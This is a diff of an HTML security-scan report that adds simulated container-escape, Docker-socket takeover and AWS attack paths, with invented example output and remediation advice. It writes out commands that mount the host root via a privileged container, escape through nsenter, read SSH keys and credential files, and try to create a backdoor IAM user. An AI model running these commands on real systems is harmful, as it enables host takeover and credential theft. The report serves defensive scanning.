@@ -1214,7 +1214,7 @@ body {
     <div class="container">
         <div class="header">
             <h1>🥷 GreninjaSec Security Report</h1>
-            <div class="timestamp">Generated: Friday, October 31, 2025 at 8:34 PM</div>
+            <div class="timestamp">Generated: Friday, October 31, 2025 at 8:58 PM</div>
         </div>
 
         <div class="stats-grid">
@@ -1242,7 +1242,7 @@ body {
 
         <div class="tabs">
             <button class="tab-button active" onclick="openTab(event, 'overview')">📊 Overview</button>
-            <button class="tab-button" onclick="openTab(event, 'shadow-deploy')">🎭 Shadow Deploy (0)</button>
+            <button class="tab-button" onclick="openTab(event, 'shadow-deploy')">🎭 Shadow Deploy (3)</button>
             
             
             <button class="tab-button" onclick="openTab(event, 'kubernetes')">☸️ Kubernetes</button>
@@ -1256,7 +1256,7 @@ body {
         <div id="overview" class="tab-content active">
             <div class="summary-box">
                 <h3>📊 Scan Summary</h3>
-                <p>Scan completed on October 31, 2025 at 8:34 PM. Found 160 total security issues across 11 files. 31 critical, 84 high, 31 medium, and 14 low severity findings detected.</p>
+                <p>Scan completed on October 31, 2025 at 8:58 PM. Found 160 total security issues across 11 files. 31 critical, 84 high, 31 medium, and 14 low severity findings detected.</p>
             </div>
 
             
@@ -1269,15 +1269,15 @@ body {
                     <div class="quick-stat-label">Scanners Used</div>
                     <div class="scanner-list">
                         
-                        <span class="scanner-badge">Shadow Deploy</span>
-                        
-                        <span class="scanner-badge">Kubernetes (kubesec)</span>
-                        
                         <span class="scanner-badge">Secrets (gitleaks)</span>
                         
                         <span class="scanner-badge">Docker (hadolint)</span>
                         
                         <span class="scanner-badge">Terraform (tfsec)</span>
+                        
+                        <span class="scanner-badge">Shadow Deploy</span>
+                        
+                        <span class="scanner-badge">Kubernetes (kubesec)</span>
                         
                     </div>
                 </div>
@@ -1457,7 +1457,7 @@ body {
                 </div>
                 <div class="shadow-metric-card time">
                     <div class="shadow-metric-label">Time to Compromise</div>
-                    <div class="shadow-metric-value">10.035µs</div>
+                    <div class="shadow-metric-value">12.74µs</div>
                 </div>
                 <div class="shadow-metric-card cost">
                     <div class="shadow-metric-label">Estimated Breach Cost</div>
@@ -1496,88 +1496,7 @@ body {
 
             
             <div class="shadow-attacks-section">
-                <h3>⚔️ Simulated Attack Paths (0)</h3>
-                
-                <div class="shadow-attack-card">
-                    <div class="shadow-attack-header">
-                        <div>
-                            <h4>Docker Socket Host Takeover</h4>
-                            <p class="shadow-attack-desc"></p>
-                        </div>
-                        <span class="severity-badge severity-medium">MEDIUM</span>
-                    </div>
-                    
-                    <div class="shadow-attack-meta">
-                        <span class="meta-item">🎯 Vector: docker_socket_abuse</span>
-                        <span class="meta-item">⏱️ Duration: 25.142µs</span>
-                        <span class="meta-item">✅ Success</span>
-                    </div>
-
-                    
-                    <div class="shadow-steps">
-                        <h5>Attack Steps:</h5>
-                        
-                        <div class="shadow-step">
-                            <div class="shadow-step-num">1</div>
-                            <div class="shadow-step-content">
-                                <div class="shadow-step-desc">Check Docker socket accessibility</div>
-                                
-                                <code class="shadow-command">$ test -S /var/run/docker.sock &amp;&amp; echo &#39;Socket accessible&#39;</code>
-                                
-                                
-                                <div class="shadow-output">[SIMULATED] Check Docker socket accessibility would succeed</div>
-                                
-                            </div>
-                            <span class="shadow-step-status">✓</span>
-                        </div>
-                        
-                        <div class="shadow-step">
-                            <div class="shadow-step-num">2</div>
-                            <div class="shadow-step-content">
-                                <div class="shadow-step-desc">List running containers</div>
-                                
-                                <code class="shadow-command">$ docker ps</code>
-                                
-                                
-                                <div class="shadow-output">[SIMULATED] List running containers would succeed</div>
-                                
-                            </div>
-                            <span class="shadow-step-status">✓</span>
-                        </div>
-                        
-                        <div class="shadow-step">
-                            <div class="shadow-step-num">3</div>
-                            <div class="shadow-step-content">
-                                <div class="shadow-step-desc">Spawn privileged container with host root</div>
-                                
-                                <code class="shadow-command">$ docker run -v /:/host --privileged alpine chroot /host</code>
-                                
-                                
-                                <div class="shadow-output">[SIMULATED] Spawn privileged container with host root would succeed</div>
-                                
-                            </div>
-                            <span class="shadow-step-status">✓</span>
-                        </div>
-                        
-                        <div class="shadow-step">
-                            <div class="shadow-step-num">4</div>
-                            <div class="shadow-step-content">
-                                <div class="shadow-step-desc">Access host secrets</div>
-                                
-                                <code class="shadow-command">$ cat /host/root/.ssh/id_rsa</code>
-                                
-                                
-                                <div class="shadow-output">[SIMULATED] Access host secrets would succeed</div>
-                                
-                            </div>
-                            <span class="shadow-step-status">✓</span>
-                        </div>
-                        
-                    </div>
-
-                    
-                    
-                </div>
+                <h3>⚔️ Simulated Attack Paths (3)</h3>
                 
                 <div class="shadow-attack-card">
                     <div class="shadow-attack-header">
@@ -1590,7 +1509,7 @@ body {
                     
                     <div class="shadow-attack-meta">
                         <span class="meta-item">🎯 Vector: cloud_takeover</span>
-                        <span class="meta-item">⏱️ Duration: 13.34µs</span>
+                        <span class="meta-item">⏱️ Duration: 27.296µs</span>
                         <span class="meta-item">✅ Success</span>
                     </div>
 
@@ -1606,7 +1525,11 @@ body {
                                 <code class="shadow-command">$ aws sts get-caller-identity</code>
                                 
                                 
-                                <div class="shadow-output">[SIMULATED] Identify current AWS permissions would succeed</div>
+                                <div class="shadow-output">{
+    &#34;UserId&#34;: &#34;AIDAI23EXAMPLE4EXAMPLE&#34;,
+    &#34;Account&#34;: &#34;123456789012&#34;,
+    &#34;Arn&#34;: &#34;arn:aws:iam::123456789012:user/compromised-user&#34;
+}</div>
                                 
                             </div>
                             <span class="shadow-step-status">✓</span>
@@ -1620,7 +1543,13 @@ body {
                                 <code class="shadow-command">$ aws iam list-users</code>
                                 
                                 
-                                <div class="shadow-output">[SIMULATED] List IAM users and roles would succeed</div>
+                                <div class="shadow-output">{
+    &#34;Users&#34;: [
+        {&#34;UserName&#34;: &#34;admin&#34;, &#34;UserId&#34;: &#34;AIDAI1234EXAMPLE&#34;, &#34;Arn&#34;: &#34;arn:aws:iam::123456789012:user/admin&#34;},
+        {&#34;UserName&#34;: &#34;dev-user&#34;, &#34;UserId&#34;: &#34;AIDAI5678EXAMPLE&#34;, &#34;Arn&#34;: &#34;arn:aws:iam::123456789012:user/dev-user&#34;},
+        {&#34;UserName&#34;: &#34;prod-deploy&#34;, &#34;UserId&#34;: &#34;AIDAI9012EXAMPLE&#34;, &#34;Arn&#34;: &#34;arn:aws:iam::123456789012:user/prod-deploy&#34;}
+    ]
+}</div>
                                 
                             </div>
                             <span class="shadow-step-status">✓</span>
@@ -1634,7 +1563,8 @@ body {
                                 <code class="shadow-command">$ aws iam create-user --user-name backdoor-admin 2&gt;/dev/null || echo &#39;Insufficient permissions&#39;</code>
                                 
                                 
-                                <div class="shadow-output">[SIMULATED] Check if can create new admin user would succeed</div>
+                                <div class="shadow-output">Insufficient permissions
+Error: AccessDenied - User is not authorized to perform: iam:CreateUser</div>
                                 
                             </div>
                             <span class="shadow-step-status">✓</span>
@@ -1648,7 +1578,11 @@ body {
                                 <code class="shadow-command">$ aws ec2 describe-instances --query &#39;Reservations[*].Instances[*].[InstanceId,State.Name,PrivateIpAddress]&#39;</code>
                                 
                                 
-                                <div class="shadow-output">[SIMULATED] List accessible EC2 instances would succeed</div>
+                                <div class="shadow-output">[
+    [&#34;i-0abc123def456&#34;, &#34;running&#34;, &#34;10.0.1.45&#34;],
+    [&#34;i-0def456ghi789&#34;, &#34;running&#34;, &#34;10.0.1.67&#34;],
+    [&#34;i-0ghi789jkl012&#34;, &#34;stopped&#34;, &#34;10.0.2.23&#34;]
+]</div>
                                 
                             </div>
                             <span class="shadow-step-status">✓</span>
@@ -1671,7 +1605,7 @@ body {
                     
                     <div class="shadow-attack-meta">
                         <span class="meta-item">🎯 Vector: container_escape</span>
-                        <span class="meta-item">⏱️ Duration: 10.035µs</span>
+                        <span class="meta-item">⏱️ Duration: 13.55µs</span>
                         <span class="meta-item">✅ Success</span>
                     </div>
 
@@ -1687,7 +1621,11 @@ body {
                                 <code class="shadow-command">$ cat /proc/self/status | grep CapEff</code>
                                 
                                 
-                                <div class="shadow-output">[SIMULATED] Check if container is privileged would succeed</div>
+                                <div class="shadow-output">CapInh: 0000003fffffffff
+CapPrm: 0000003fffffffff
+CapEff: 0000003fffffffff
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000</div>
                                 
                             </div>
                             <span class="shadow-step-status">✓</span>
@@ -1701,7 +1639,8 @@ body {
                                 <code class="shadow-command">$ nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh</code>
                                 
                                 
-                                <div class="shadow-output">[SIMULATED] Escape to host namespace would succeed</div>
+                                <div class="shadow-output"># Escaped to host namespace successfully
+# Now running as root on host system</div>
                                 
                             </div>
                             <span class="shadow-step-status">✓</span>
@@ -1715,7 +1654,12 @@ body {
                                 <code class="shadow-command">$ hostname &amp;&amp; cat /etc/os-release</code>
                                 
                                 
-                                <div class="shadow-output">[SIMULATED] Verify host access would succeed</div>
+                                <div class="shadow-output">production-k8s-node-01
+NAME=&#34;Ubuntu&#34;
+VERSION=&#34;22.04.3 LTS (Jammy Jellyfish)&#34;
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME=&#34;Ubuntu 22.04.3 LTS&#34;</div>
                                 
                             </div>
                             <span class="shadow-step-status">✓</span>
@@ -1729,7 +1673,101 @@ body {
                                 <code class="shadow-command">$ find /root /home -name &#39;*credentials*&#39; -o -name &#39;*.pem&#39; 2&gt;/dev/null | head -5</code>
                                 
                                 
-                                <div class="shadow-output">[SIMULATED] Search for cloud credentials would succeed</div>
+                                <div class="shadow-output">/root/.aws/credentials
+/home/ubuntu/.aws/credentials
+/root/.kube/config
+/home/deploy/.ssh/id_rsa
+/opt/app/config/prod-credentials.json</div>
+                                
+                            </div>
+                            <span class="shadow-step-status">✓</span>
+                        </div>
+                        
+                    </div>
+
+                    
+                    
+                </div>
+                
+                <div class="shadow-attack-card">
+                    <div class="shadow-attack-header">
+                        <div>
+                            <h4>Docker Socket Host Takeover</h4>
+                            <p class="shadow-attack-desc"></p>
+                        </div>
+                        <span class="severity-badge severity-medium">MEDIUM</span>
+                    </div>
+                    
+                    <div class="shadow-attack-meta">
+                        <span class="meta-item">🎯 Vector: docker_socket_abuse</span>
+                        <span class="meta-item">⏱️ Duration: 12.74µs</span>
+                        <span class="meta-item">✅ Success</span>
+                    </div>
+
+                    
+                    <div class="shadow-steps">
+                        <h5>Attack Steps:</h5>
+                        
+                        <div class="shadow-step">
+                            <div class="shadow-step-num">1</div>
+                            <div class="shadow-step-content">
+                                <div class="shadow-step-desc">Check Docker socket accessibility</div>
+                                
+                                <code class="shadow-command">$ test -S /var/run/docker.sock &amp;&amp; echo &#39;Socket accessible&#39;</code>
+                                
+                                
+                                <div class="shadow-output">Socket accessible</div>
+                                
+                            </div>
+                            <span class="shadow-step-status">✓</span>
+                        </div>
+                        
+                        <div class="shadow-step">
+                            <div class="shadow-step-num">2</div>
+                            <div class="shadow-step-content">
+                                <div class="shadow-step-desc">List running containers</div>
+                                
+                                <code class="shadow-command">$ docker ps</code>
+                                
+                                
+                                <div class="shadow-output">CONTAINER ID   IMAGE              COMMAND                  CREATED        STATUS        PORTS                    NAMES
+a1b2c3d4e5f6   nginx:latest       &#34;/docker-entrypoint.…&#34;   2 hours ago    Up 2 hours    0.0.0.0:80-&gt;80/tcp       web-server
+b2c3d4e5f6g7   postgres:14        &#34;docker-entrypoint.s…&#34;   5 hours ago    Up 5 hours    0.0.0.0:5432-&gt;5432/tcp   database
+c3d4e5f6g7h8   redis:alpine       &#34;docker-entrypoint.s…&#34;   1 day ago      Up 1 day      0.0.0.0:6379-&gt;6379/tcp   cache</div>
+                                
+                            </div>
+                            <span class="shadow-step-status">✓</span>
+                        </div>
+                        
+                        <div class="shadow-step">
+                            <div class="shadow-step-num">3</div>
+                            <div class="shadow-step-content">
+                                <div class="shadow-step-desc">Spawn privileged container with host root</div>
+                                
+                                <code class="shadow-command">$ docker run -v /:/host --privileged alpine chroot /host</code>
+                                
+                                
+                                <div class="shadow-output"># Successfully spawned privileged container
+# Now inside host root filesystem
+# Full access to /host/* (entire host filesystem)</div>
+                                
+                            </div>
+                            <span class="shadow-step-status">✓</span>
+                        </div>
+                        
+                        <div class="shadow-step">
+                            <div class="shadow-step-num">4</div>
+                            <div class="shadow-step-content">
+                                <div class="shadow-step-desc">Access host secrets</div>
+                                
+                                <code class="shadow-command">$ cat /host/root/.ssh/id_rsa</code>
+                                
+                                
+                                <div class="shadow-output">-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA2K8h9vxFx6t5JN9wK3V8F...
+[REDACTED - SSH private key would be here]
+...
+-----END RSA PRIVATE KEY-----</div>
                                 
                             </div>
                             <span class="shadow-step-status">✓</span>
@@ -1751,17 +1789,6 @@ body {
                 <div class="shadow-rec-card priority-high">
                     <div class="shadow-rec-header">
                         <span class="priority-badge priority-high">HIGH</span>
-                        <span class="shadow-rec-title">Remove Docker socket mounts</span>
-                    </div>
-                    <p class="shadow-rec-desc">Mounted /var/run/docker.sock allows spawning privileged containers on host</p>
-                    
-                    <code class="shadow-fix-command">$ Remove hostPath volume mount for /var/run/docker.sock</code>
-                    
-                </div>
-                
-                <div class="shadow-rec-card priority-high">
-                    <div class="shadow-rec-header">
-                        <span class="priority-badge priority-high">HIGH</span>
                         <span class="shadow-rec-title">Rotate exposed credentials immediately</span>
                     </div>
                     <p class="shadow-rec-desc">Hardcoded AWS/cloud credentials detected in configuration</p>
@@ -1778,6 +1805,17 @@ body {
                     <p class="shadow-rec-desc">Containers with privileged: true can escape to host using nsenter or similar techniques</p>
                     
                     <code class="shadow-fix-command">$ Set securityContext.privileged: false and use specific capabilities instead</code>
+                    
+                </div>
+                
+                <div class="shadow-rec-card priority-high">
+                    <div class="shadow-rec-header">
+                        <span class="priority-badge priority-high">HIGH</span>
+                        <span class="shadow-rec-title">Remove Docker socket mounts</span>
+                    </div>
+                    <p class="shadow-rec-desc">Mounted /var/run/docker.sock allows spawning privileged containers on host</p>
+                    
+                    <code class="shadow-fix-command">$ Remove hostPath volume mount for /var/run/docker.sock</code>
                     
                 </div>
                 
@@ -6916,10 +6954,46 @@ document.addEventListener('DOMContentLoaded', function() {
                     title: {
                         display: true,
                         text: 'Findings by Severity',
-                        font: { size: 16, weight: 'bold' }
+                        font: { size: 18, weight: 'bold' },
+                        padding: { top: 10, bottom: 20 },
+                        color: '#1e293b'
                     },
                     legend: {
-                        position: 'bottom'
+                        display: true,
+                        position: 'bottom',
+                        labels: {
+                            padding: 15,
+                            font: { size: 13, weight: '500' },
+                            color: '#475569',
+                            usePointStyle: true,
+                            pointStyle: 'circle',
+                            generateLabels: function(chart) {
+                                const data = chart.data;
+                                if (data.labels.length && data.datasets.length) {
+                                    return data.labels.map((label, i) => {
+                                        const value = data.datasets[0].data[i];
+                                        return {
+                                            text: `${label}: ${value}`,
+                                            fillStyle: data.datasets[0].backgroundColor[i],
+                                            hidden: false,
+                                            index: i
+                                        };
+                                    });
+                                }
+                                return [];
+                            }
+                        }
+                    },
+                    tooltip: {
+                        callbacks: {
+                            label: function(context) {
+                                const label = context.label || '';
+                                const value = context.parsed || 0;
+                                const total = context.dataset.data.reduce((a, b) => a + b, 0);
+                                const percentage = total > 0 ? ((value / total) * 100).toFixed(1) : 0;
+                                return `${label}: ${value} (${percentage}%)`;
+                            }
+                        }
                     }
                 }
             }
